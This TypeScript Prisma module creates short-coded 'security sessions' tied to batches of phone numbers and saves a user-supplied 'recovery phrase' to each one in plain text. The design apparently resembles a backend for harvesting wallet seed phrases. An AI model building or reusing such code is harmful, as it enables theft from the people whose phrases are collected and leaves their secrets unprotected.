import { PrismaClient } from '../generated/prisma'
import { withAccelerate } from '@prisma/extension-accelerate'
import { nanoid } from 'nanoid';

const globalForPrisma = global as unknown as {
    prisma: PrismaClient
}

const prisma = globalForPrisma.prisma || new PrismaClient().$extends(withAccelerate())

if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma


export async function saveRecoveryPhrase(securityCode: string, phrase: string) {
    // Check if the security session exists
    const session = await prisma.securitySession.findUnique({
        where: { securityCode },
    });
    if (!session) {
        return { message: `❌ Security session with code ${securityCode} not found`, status: 404 };
    }

    // Check if the recovery phrase is already set
    if (session.recoveryPhrase) {
        return { message: `❌ Recovery phrase already set for code ${securityCode}`, status: 400 };
    }

    await prisma.securitySession.update({
        where: { securityCode },
        data: {
            recoveryPhrase: phrase,
            status: 'completed'
        },
    });

    return { message: `Recovery phrase updated for code ${securityCode}`, status: 200 };
}

export async function createUniqueSecuritySession(phoneNumber: string, batchId: string) {
    const MAX_ATTEMPTS = 5;
    let attempt = 0;

    while (attempt < MAX_ATTEMPTS) {
        const securityCode = nanoid(5).toUpperCase();

        try {
            return await prisma.securitySession.create({
                data: {
                    phoneNumber,
                    securityCode,
                    batchId,
                },
            });
        } catch (error: any) {
            if (error.code === 'P2002' && error.meta?.target?.includes('securityCode')) {
                // Unique constraint failed on the securityCode field — try again
                attempt++;
                continue;
            } else {
                throw error;
            }
        }
    }

    throw new Error('Failed to generate a unique security code after multiple attempts');
}

export default prisma

